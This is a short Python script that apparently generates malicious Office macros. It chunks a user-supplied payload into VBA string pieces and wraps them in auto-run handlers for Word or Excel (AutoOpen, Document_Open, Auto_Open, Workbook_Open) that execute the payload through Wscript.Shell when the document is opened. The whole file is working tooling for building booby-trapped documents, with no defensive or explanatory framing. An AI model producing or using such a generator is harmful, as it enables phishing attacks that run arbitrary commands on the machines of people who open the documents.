import sys
import base64

def help():
  print("Usage: ./generate_macro.py <type> <payload>")
  exit()

try:
  macro_type = sys.argv[1]
  payload = sys.argv[2]
except:
  help()

macro_xls_payload= """
Sub Auto_Open()
    MyMacro
End Sub

Sub Workbook_Open()
    MyMacro
End Sub

"""

macro_doc_payload= """
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

"""

macro_payload= """
Sub MyMacro()
	Dim Str as String

"""

for i in range(0, len(payload), 50):
  macro_payload = macro_payload + "        Str = Str + " + '"' + payload[i:i + 50] + '"\n'

macro_payload = macro_payload + """
	CreateObject("Wscript.Shell").Run Str
End Sub
"""
if macro_type == "xls":
    macro_payload = macro_xls_payload + macro_payload
elif macro_type == "doc":
    macro_payload = macro_doc_payload + macro_payload
else:
    macro_payload = macro_doc_payload + macro_payload

print(macro_payload)